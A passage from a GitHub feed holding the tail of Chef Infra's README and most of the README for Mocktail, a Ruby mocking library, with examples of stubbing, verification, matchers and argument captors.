Maximum&lt;/a&gt;&lt;/strong&gt;: 14 days&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Pull Request &lt;a href=&#34;https://github.com/chef/chef-oss-practices/raw/main/repo-management/repo-states.md&#34;&gt;Response Time Maximum&lt;/a&gt;&lt;/strong&gt;: 14 days&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;Chef Infra is a configuration management tool designed to bring automation to your entire infrastructure.&lt;/p&gt; &#xA;&lt;h3&gt;Want to try Chef Infra?&lt;/h3&gt; &#xA;&lt;p&gt;For Chef Infra usage, please refer to &lt;a href=&#34;https://learn.chef.io/&#34;&gt;Learn Chef&lt;/a&gt;, our self-paced, entirely free learning platform. Learn Chef also includes module-based training for Chef Infra, as well as Chef Automate, Chef Habitat, and Chef InSpec.&lt;/p&gt; &#xA;&lt;p&gt;Other useful resources for Chef Infra users:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Documentation: &lt;a href=&#34;https://docs.chef.io/&#34;&gt;https://docs.chef.io/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Source: &lt;a href=&#34;https://github.com/chef/chef/tree/main&#34;&gt;https://github.com/chef/chef/tree/main&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Tickets/Issues: &lt;a href=&#34;https://github.com/chef/chef/issues&#34;&gt;https://github.com/chef/chef/issues&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Slack: &lt;a href=&#34;https://community-slack.chef.io/&#34;&gt;Chef Community Slack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Mailing list/Forum: &lt;a href=&#34;https://discourse.chef.io&#34;&gt;https://discourse.chef.io&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Reporting Issues&lt;/h2&gt; &#xA;&lt;p&gt;Issues can be reported by using &lt;a href=&#34;https://github.com/chef/chef/issues&#34;&gt;GitHub Issues&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Note that this repository is primarily for reporting issues in the chef-client itself. For reporting issues against other Chef projects, please look up the appropriate repository. If you&#39;re unsure where to submit an issue, please ask in the #chef-dev channel in &lt;a href=&#34;https://community-slack.chef.io/&#34;&gt;Chef Community Slack&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;How We Build &amp;amp; Release Chef&lt;/h2&gt; &#xA;&lt;p&gt;For information on how a contribution goes from PR to released package, see &lt;a href=&#34;https://raw.githubusercontent.com/chef/chef/main/docs/dev/design_documents/how_chef_is_tested_and_built.md&#34;&gt;How Chef Infra Is Built&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;To learn more about our monthly feature releases and yearly major releases, see &lt;a href=&#34;https://raw.githubusercontent.com/chef/chef/main/docs/dev/policy/release_and_support_schedule.md&#34;&gt;Chef Infra Release and Support Schedule&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Getting Involved&lt;/h2&gt; &#xA;&lt;p&gt;We&#39;d love to have your help developing Chef Infra. See our &lt;a href=&#34;https://raw.githubusercontent.com/chef/chef/main/CONTRIBUTING.md&#34;&gt;Contributing Document&lt;/a&gt; for more information on getting started.&lt;/p&gt; &#xA;&lt;h2&gt;License and Copyright&lt;/h2&gt; &#xA;&lt;p&gt;Copyright 2008-2020, Chef Software, Inc.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Licensed under the Apache License, Version 2.0 (the &#34;License&#34;);&#xA;you may not use this file except in compliance with the License.&#xA;You may obtain a copy of the License at&#xA;&#xA;    http://www.apache.org/licenses/LICENSE-2.0&#xA;&#xA;Unless required by applicable law or agreed to in writing, software&#xA;distributed under the License is distributed on an &#34;AS IS&#34; BASIS,&#xA;WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.&#xA;See the License for the specific language governing permissions and&#xA;limitations under the License.&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>testdouble/mocktail</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/testdouble/mocktail</id>
    <link href="https://github.com/testdouble/mocktail" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/79303/134366631-9c6cfe67-a9c0-4096-bbea-ba1698a85b0b.png&#34; width=&#34;90%&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Mocktail 🍸&lt;/h1&gt; &#xA;&lt;p&gt;Mocktail is a &lt;a href=&#34;https://github.com/testdouble/contributing-tests/wiki/Test-Double&#34;&gt;test double&lt;/a&gt; library for Ruby that provides a terse and robust API for creating mocks, getting them in the hands of the code you&#39;re testing, stub &amp;amp; verify behavior, and even safely override class methods.&lt;/p&gt; &#xA;&lt;h2&gt;An aperitif&lt;/h2&gt; &#xA;&lt;p&gt;Before getting into the details, let&#39;s demonstrate what Mocktail&#39;s API looks like. Suppose you want to test a &lt;code&gt;Bartender&lt;/code&gt; class:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class Bartender&#xA;  def initialize&#xA;    @shaker = Shaker.new&#xA;    @glass = Glass.new&#xA;    @bar = Bar.new&#xA;  end&#xA;&#xA;  def make_drink(name, customer:)&#xA;    if name == :negroni&#xA;      drink = @shaker.combine(:gin, :campari, :sweet_vermouth)&#xA;      @glass.pour!(drink)&#xA;      @bar.pass(@glass, to: customer)&#xA;    end&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You could write an isolated unit test with Mocktail like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;shaker = Mocktail.of_next(Shaker)&#xA;glass = Mocktail.of_next(Glass)&#xA;bar = Mocktail.of_next(Bar)&#xA;subject = Bartender.new&#xA;stubs { shaker.combine(:gin, :campari, :sweet_vermouth) }.with { :a_drink }&#xA;stubs { bar.pass(glass, to: &#34;Eileen&#34;) }.with { &#34;🎉&#34; }&#xA;&#xA;result = subject.make_drink(:negroni, customer: &#34;Eileen&#34;)&#xA;&#xA;assert_equal &#34;🎉&#34;, result&#xA;# Oh yeah, and make sure the drink got poured! Silly side effects!&#xA;verify { glass.pour!(:a_drink) }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Why Mocktail?&lt;/h2&gt; &#xA;&lt;p&gt;Besides helping you avoid a hangover, Mocktail offers several advantages over Ruby&#39;s other mocking libraries:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Simpler test recipes&lt;/strong&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/testdouble/mocktail/main/#mocktailof_next&#34;&gt;Mocktail.of_next(type)&lt;/a&gt; both creates your mock and supplies to your subject under test in a single one-liner. No more forcing dependency injection for the sake of your tests&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;WYSIWYG API&lt;/strong&gt;: Want to know how to stub a call to &lt;code&gt;phone.dial(911)&lt;/code&gt;? You just demonstrate the call with &lt;code&gt;stubs { phone.dial(911) }.with { :operator }&lt;/code&gt;. Because stubbing &amp;amp; verifying looks just like the actual call, your tests becomes a sounding board for your APIs as you invent them&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Argument validation&lt;/strong&gt;: Ever see a test pass after a change to a mocked method should have broken it? Not with Mocktail, you haven&#39;t&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Mocked class methods&lt;/strong&gt;: Singleton methods on modules and classes can be faked out using &lt;a href=&#34;https://raw.githubusercontent.com/testdouble/mocktail/main/#mocktailreplace&#34;&gt;&lt;code&gt;Mocktail.replace(type)&lt;/code&gt;&lt;/a&gt; without sacrificing thread safety&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Super-duper detailed error messages&lt;/strong&gt; A good mocking library should make coding feel like &lt;a href=&#34;https://en.wikipedia.org/wiki/Paint_by_number&#34;&gt;paint-by-number&lt;/a&gt;, thoughtfully guiding you from one step to the next. Calling a method that doesn&#39;t exist will print a sample definition you can copy-paste. Verification failures will print every call that &lt;em&gt;did&lt;/em&gt; occur. And &lt;a href=&#34;https://raw.githubusercontent.com/testdouble/mocktail/main/#mocktailexplain&#34;&gt;Mocktail.explain()&lt;/a&gt; provides even more introspection&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Expressive&lt;/strong&gt;: Built-in &lt;a href=&#34;https://raw.githubusercontent.com/testdouble/mocktail/main/#mocktailmatchers&#34;&gt;argument matchers&lt;/a&gt; and a simple API for adding &lt;a href=&#34;https://raw.githubusercontent.com/testdouble/mocktail/main/#custom-matchers&#34;&gt;custom matchers&lt;/a&gt; allow you to tune your stubbing configuration and call verification to match &lt;em&gt;exactly&lt;/em&gt; what your test intends&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Powerful&lt;/strong&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/testdouble/mocktail/main/#mocktailcaptor&#34;&gt;Argument captors&lt;/a&gt; for assertions of very complex arguments, as well as advanced configuration options for stubbing &amp;amp; verification&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Ready to order?&lt;/h2&gt; &#xA;&lt;h3&gt;Install the gem&lt;/h3&gt; &#xA;&lt;p&gt;The main ingredient to add to your Gemfile:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;gem &#34;mocktail&#34;, group: :test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Sprinkle in the DSL&lt;/h3&gt; &#xA;&lt;p&gt;Then, in each of your tests or in a test helper, you&#39;ll probably want to include Mocktail&#39;s DSL. (This is optional, however, as every method in the DSL is also available as a singleton method on &lt;code&gt;Mocktail&lt;/code&gt;.)&lt;/p&gt; &#xA;&lt;p&gt;In Minitest, you might add the DSL with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class Minitest::Test&#xA;  include Mocktail::DSL&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or, in RSpec:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;RSpec.configure do |config|&#xA;  config.include Mocktail::DSL&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Clean up when you&#39;re done&lt;/h3&gt; &#xA;&lt;p&gt;To reset Mocktail&#39;s internal state between tests and avoid test pollution, you should also call &lt;code&gt;Mocktail.reset&lt;/code&gt; after each test:&lt;/p&gt; &#xA;&lt;p&gt;In Minitest:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class Minitest::Test&#xA;  # Or, if in a Rails test, in a `teardown do…end` block&#xA;  def teardown&#xA;    Mocktail.reset&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And RSpec:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;RSpec.configure do |config|&#xA;  config.after(:each) do&#xA;    Mocktail.reset&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;API&lt;/h2&gt; &#xA;&lt;p&gt;The entire public API is listed in the &lt;a href=&#34;https://raw.githubusercontent.com/testdouble/mocktail/main/lib/mocktail.rb&#34;&gt;top-level module&#39;s source&lt;/a&gt;. Below is a longer menu to explain what goes into each feature.&lt;/p&gt; &#xA;&lt;h3&gt;Mocktail.of&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;Mocktail.of(module_or_class)&lt;/code&gt; takes a module or class and returns an instance of an object with fake methods in place of all its instance methods which can then be stubbed or verified.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class Clothes; end;&#xA;class Shoe &amp;lt; Clothes&#xA;  def tie(laces)&#xA;  end&#xA;end&#xA;&#xA;shoe = Mocktail.of(Shoe)&#xA;shoe.instance_of?(Shoe) # =&amp;gt; true&#xA;shoe.is_a?(Clothes) # =&amp;gt; true&#xA;shoe.class == Shoe # =&amp;gt; false!&#xA;shoe.to_s # =&amp;gt; #&amp;lt;Mocktail of Shoe:0x00000001343b57b0&amp;gt;&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Mocktail.of_next&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;Mocktail.of_next(klass, [count: 1])&lt;/code&gt; takes a class and returns one mock (the default) or an array of multiple mocks. It also effectively overrides the behavior of that class&#39;s constructor to return those mock(s) in order and finally restoring its previous behavior.&lt;/p&gt; &#xA;&lt;p&gt;For example, if you wanted to test the &lt;code&gt;Notifier&lt;/code&gt; class below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class Notifier&#xA;  def initialize&#xA;    @mailer = Mailer.new&#xA;  end&#xA;&#xA;  def notify(name)&#xA;    @mailer.deliver!(&#34;Hello, #{name}&#34;)&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You could write a test like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def test_notifier&#xA;  mailer = Mocktail.of_next(Mailer)&#xA;  subject = Notifier.new&#xA;&#xA;  subject.notify(&#34;Pants&#34;)&#xA;&#xA;  verify { mailer.deliver!(&#34;Hello, Pants&#34;) }&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There&#39;s nothing wrong with creating mocks using &lt;code&gt;Mocktail.of&lt;/code&gt; and passing them to your subject some other way, but this approach allows you to write very terse isolation tests without foisting additional indirection or dependency injection in for your tests&#39; sake.&lt;/p&gt; &#xA;&lt;h3&gt;Mocktail.stubs&lt;/h3&gt; &#xA;&lt;p&gt;Configuring a fake method to take a certain action or return a particular value is called &#34;stubbing&#34;. To stub a call with a value, you can call &lt;code&gt;Mocktail.stubs&lt;/code&gt; (or just &lt;code&gt;stubs&lt;/code&gt; if you&#39;ve included &lt;code&gt;Mocktail::DSL&lt;/code&gt;) and then specify an effect that will be invoked whenever that call configuration is satisfied using &lt;code&gt;with&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The API is very simple in the simple case:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class UserRepository&#xA;  def find(id, debug: false); end&#xA;&#xA;  def transaction(&amp;amp;blk); end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You could stub responses to a mock of the &lt;code&gt;UserRepository&lt;/code&gt; like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;user_repository = Mocktail.of(UserRepository)&#xA;&#xA;stubs { user_repository.find(42) }.with { :a_user }&#xA;user_repository.find(42) # =&amp;gt; :a_user&#xA;user_repository.find(43) # =&amp;gt; nil&#xA;user_repository.find # =&amp;gt; ArgumentError: wrong number of arguments (given 0, expected 1)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The block passed to &lt;code&gt;stubs&lt;/code&gt; is called the &#34;demonstration&#34;, because it represents an example of the kind of calls that Mocktail should match.&lt;/p&gt; &#xA;&lt;p&gt;If you want to get fancy, you can use matchers to make your demonstration more dynamic. For example, you could match any number with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;stubs { |m| user_repository.find(m.numeric) }.with { :another_user }&#xA;user_repository.find(41) # =&amp;gt; :another_user&#xA;user_repository.find(42) # =&amp;gt; :another_user&#xA;user_repository.find(43) # =&amp;gt; :another_user&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Stubbings are last-in-wins, which is why the stubbing above would have overridden the earlier-but-more-specific stubbing of &lt;code&gt;find(42)&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;A stubbing&#39;s effect can also be changed dynamically based on the actual call that satisfied the demonstration by looking at the &lt;code&gt;call&lt;/code&gt; block argument:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;stubs { |m| user_repository.find(m.is_a(Integer)) }.with { |call|&#xA;  {id: call.args.first}&#xA;}&#xA;user_repository.find(41) # =&amp;gt; {id: 41}&#xA;# Since 42.5 is a Float, the earlier stubbing will win here:&#xA;user_repository.find(42.5) # =&amp;gt; :another_user&#xA;user_repository.find(43) # =&amp;gt; {id: 43}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It&#39;s certainly more complex to think through, but if your stubbed method takes a block, your demonstration can pass a block of its own and inspect or invoke it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;stubs {&#xA;  user_repository.transaction { |block| block.call == {id: 41} }&#xA;}.with { :successful_transaction }&#xA;&#xA;user_repository.transaction {&#xA;  user_repository.find(41)&#xA;} # =&amp;gt; :successful_transaction&#xA;user_repository.transaction {&#xA;  user_repository.find(40)&#xA;} # =&amp;gt; nil&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There are also several advanced options you can pass to &lt;code&gt;stubs&lt;/code&gt; to control its behavior.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;times&lt;/code&gt; will limit the number of times a satisfied stubbing can have its effect:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;stubs { |m| user_repository.find(m.any) }.with { :not_found }&#xA;stubs(times: 2) { |m| user_repository.find(1) }.with { :someone }&#xA;&#xA;user_repository.find(1) # =&amp;gt; :someone&#xA;user_repository.find(1) # =&amp;gt; :someone&#xA;user_repository.find(1) # =&amp;gt; :not_found&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;ignore_extra_args&lt;/code&gt; will allow a demonstration to be considered satisfied even if it fails to specify arguments and keyword arguments made by the actual call:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;stubs { user_repository.find(4) }.with { :a_person }&#xA;user_repository.find(4, debug: true) # =&amp;gt; nil&#xA;&#xA;stubs(ignore_extra_args: true) { user_repository.find(4) }.with { :b_person }&#xA;user_repository.find(4, debug: true) # =&amp;gt; :b_person&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And &lt;code&gt;ignore_block&lt;/code&gt; will similarly allow a demonstration to not concern itself with whether an actual call passed the method a block—it&#39;s satisfied either way:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;stubs { user_repository.transaction }.with { :transaction }&#xA;user_repository.transaction {} # =&amp;gt; nil&#xA;&#xA;stubs(ignore_block: true) { user_repository.transaction }.with { :transaction }&#xA;user_repository.transaction {} # =&amp;gt; :transaction&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Mocktail.verify&lt;/h3&gt; &#xA;&lt;p&gt;In practice, we&#39;ve found that we stub far more responses than we explicitly verify a particular call took place. That&#39;s because our code normally returns some observable value that is &lt;em&gt;influenced&lt;/em&gt; by our dependencies&#39; behavior, so adding additional assertions that they be called would be redundant. That said, for cases where a dependency doesn&#39;t return a value but just has a necessary side effect, the &lt;code&gt;verify&lt;/code&gt; method exists (and like &lt;code&gt;stubs&lt;/code&gt; is included in &lt;code&gt;Mocktail::DSL&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;p&gt;Once you&#39;ve gotten the hang of stubbing, you&#39;ll find that the &lt;code&gt;verify&lt;/code&gt; method is intentionally very similar. They almost rhyme.&lt;/p&gt; &#xA;&lt;p&gt;For this example, consider an &lt;code&gt;Auditor&lt;/code&gt; class that our code might need to call to record that certain actions took place.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class Auditor&#xA;  def record!(message, user_id:, action: nil); end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Once you&#39;ve created a mock of the &lt;code&gt;Auditor&lt;/code&gt;, you can start verifying basic calls:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;auditor = Mocktail.of(Auditor)&#xA;&#xA;verify { auditor.record!(&#34;hello&#34;, user_id: 42) }&#xA;# =&amp;gt; raised Mocktail::VerificationError&#xA;# Expected mocktail of Auditor#record! to be called like:&#xA;#&#xA;#   record!(&#34;hello&#34;, user_id: 42)&#xA;#&#xA;# But it was never called.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Wups! Verify will blow up whenever a matching call hasn&#39;t occurred, so it should be called after you&#39;ve invoked your subject under test along with any other assertions you have.&lt;/p&gt; &#xA;&lt;p&gt;If we make a call that satisfies the &lt;code&gt;verify&lt;/code&gt; call&#39;s demonstration, however, you won&#39;t see that error:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;auditor.record!(&#34;hello&#34;, user_id: 42)&#xA;&#xA;verify { auditor.record!(&#34;hello&#34;, user_id: 42) } # =&amp;gt; nil&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There, nothing happened! Just like any other assertion library, you only hear from &lt;code&gt;verify&lt;/code&gt; when verification fails.&lt;/p&gt; &#xA;&lt;p&gt;Just like with &lt;code&gt;stubs&lt;/code&gt;, you can any built-in or custom matchers can serve as garnishes for your demonstration:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;auditor.record!(&#34;hello&#34;, user_id: 42)&#xA;&#xA;verify { |m| auditor.record!(m.is_a(String), user_id: m.numeric) } # =&amp;gt; nil&#xA;# But this will raise a VerificationError:&#xA;verify { |m| auditor.record!(m.is_a(String), user_id: m.that { |arg| arg &amp;gt; 50}) }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;When you pass a block to your demonstration, it will be invoked with any block that was passed to the actual call to the mock. Truthy responses will satisfy the verification and falsey ones will fail:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;auditor.record!(&#34;ok&#34;, user_id: 1) { Time.new }&#xA;&#xA;verify { |m| auditor.record!(&#34;ok&#34;, user_id: 1) { |block| block.call.is_a?(Time) } } # =&amp;gt; nil&#xA;# But this will raise a VerificationError:&#xA;verify { |m| auditor.record!(&#34;ok&#34;, user_id: 1) { |block| block.call.is_a?(Date) } }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;verify&lt;/code&gt; supports the same options as &lt;code&gt;stubs&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;times&lt;/code&gt; will require the demonstrated call happened exactly &lt;code&gt;times&lt;/code&gt; times (by default, the call has to happen 1 or more times)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;ignore_extra_args&lt;/code&gt; will allow the demonstration to forego specifying optional arguments while still being considered satisfied&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;ignore_block&lt;/code&gt; will similarly allow the demonstration to forego specifying a block, even if the actual call receives one&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Mocktail.matchers&lt;/h3&gt; &#xA;&lt;p&gt;You&#39;ll probably never need to call &lt;code&gt;Mocktail.matchers&lt;/code&gt; directly, because it&#39;s the object that is passed to every demonstration block passed to &lt;code&gt;stubs&lt;/code&gt; and &lt;code&gt;verify&lt;/code&gt;. By default, a stubbing (e.g. &lt;code&gt;stubs { email.send(&#34;text&#34;) }&lt;/code&gt;) is only considered satisfied if every argument passed to an actual call was passed an &lt;code&gt;==&lt;/code&gt; check. Matchers allow us to relax or change that constraint for both regular arguments and keyword arguments so that our demonstrations can match more kinds of method invocations.&lt;/p&gt; &#xA;&lt;p&gt;Matchers allow you to specify stubbings and verifications that look like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;stubs { |m| email.send(m.is_a(String)) }.with { &#34;I&#39;m an email&#34; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Built-in matchers&lt;/h4&gt; &#xA;&lt;p&gt;These matchers come out of the box:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;any&lt;/code&gt; - Will match any value (even nil) in the given argument position or keyword&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;is_a(type)&lt;/code&gt; - Will match when its &lt;code&gt;type&lt;/code&gt; passes an &lt;code&gt;is_a?&lt;/code&gt; check against the actual argument&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;includes(thing, [**more_things])&lt;/code&gt; - Will match when all of its arguments are contained by the corresponding argument—be it a string, array, hash, or anything that responds to &lt;code&gt;includes?&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;matches(pattern)&lt;/code&gt; - Will match when the provided string or pattern passes a &lt;code&gt;match?&lt;/code&gt; test on the corresponding argument; usually used to match strings that contain a particular substring or pattern, but will work with any argument that responds to &lt;code&gt;match?&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;not(thing)&lt;/code&gt; - Will only match when its argument &lt;em&gt;does not&lt;/em&gt; equal (via &lt;code&gt;!=&lt;/code&gt;) the actual argument&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;numeric&lt;/code&gt; - Will match when the actual argument is an instance of &lt;code&gt;Integer&lt;/code&gt;, &lt;code&gt;Float&lt;/code&gt;, or (if loaded) &lt;code&gt;BigDecimal&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;that { |arg| … }&lt;/code&gt; - Takes a block that will receive the actual argument. If the block returns truthy, it&#39;s considered a match; otherwise, it&#39;s not a match.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Custom matchers&lt;/h4&gt; &#xA;&lt;p&gt;If you want to write your own matchers, check out &lt;a href=&#34;https://raw.githubusercontent.com/testdouble/mocktail/main/lib/mocktail/matchers/includes.rb&#34;&gt;the source for examples&lt;/a&gt;. Once you&#39;ve implemented a class, just pass it to &lt;code&gt;Mocktail.register_matcher&lt;/code&gt; in your test helper.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class MyAwesomeMatcher &amp;lt; Mocktail::Matchers::Base&#xA;  def self.matcher_name&#xA;    :awesome&#xA;  end&#xA;&#xA;  def match?(actual)&#xA;    &#34;#{@expected}✨&#34; == actual&#xA;  end&#xA;end&#xA;&#xA;Mocktail.register_matcher(MyAwesomeMatcher)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then, a stubbing like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;stubs { |m| user_repository.find(m.awesome(11)) }.with { :awesome_user }&#xA;&#xA;user_repository.find(&#34;11&#34;)) # =&amp;gt; nil&#xA;user_repository.find(&#34;11✨&#34;)) # =&amp;gt; :awesome_user&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Mocktail.captor&lt;/h3&gt; &#xA;&lt;p&gt;An argument captor is a special kind of matcher… really, it&#39;s a matcher factory. Suppose you have a &lt;code&gt;verify&lt;/code&gt; call for which one of the expected arguments is &lt;em&gt;really&lt;/em&gt; complicated. Since &lt;code&gt;verify&lt;/code&gt; tends to be paired with fire-and-forget APIs that are being invoked for the side effect, this is a pretty common case. You want to be able to effectively snag that value and then run any number of specific assertions against it.&lt;/p&gt; &#xA;&lt;p&gt;That&#39;s what &lt;code&gt;Mocktail.captor&lt;/code&gt; is for. It&#39;s easiest to make sense of this by example. Given this &lt;code&gt;BigApi&lt;/code&gt; class that&#39;s presumably being called by your subject at the end of a lot of other work building up a payload:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class BigApi&#xA;  def send(payload); end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You could capture the value of that payload as part of the verification of the call:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;big_api = Mocktail.of(BigApi)&#xA;&#xA;big_api.send({imagine: &#34;that&#34;, this: &#34;is&#34;, a: &#34;huge&#34;, object: &#34;!&#34;})&#xA;&#xA;payload_captor = Mocktail.captor&#xA;verify { big_api.send(payload_captor.capture) } # =&amp;gt; nil!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The &lt;code&gt;verify&lt;/code&gt; above will pass because &lt;em&gt;a&lt;/em&gt; call did happen, but we haven&#39;t asserted anything beyond that yet. What really happened is that &lt;code&gt;payload_captor.capture&lt;/code&gt; actually returned a matcher that will return true for any argument &lt;em&gt;while also sneakily storing a copy of the argument value&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;p&gt;That&#39;s why we instantiated &lt;code&gt;payload_captor&lt;/code&gt; with &lt;code&gt;Mocktail.captor&lt;/code&gt; outside the demonstration block, so we can inspect its &lt;code&gt;value&lt;/code&gt; after the &lt;code&gt;verify&lt;/code&gt; call:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;payload_captor = Mocktail.captor&#xA;verify { big_api.send(payload_captor.capture) } 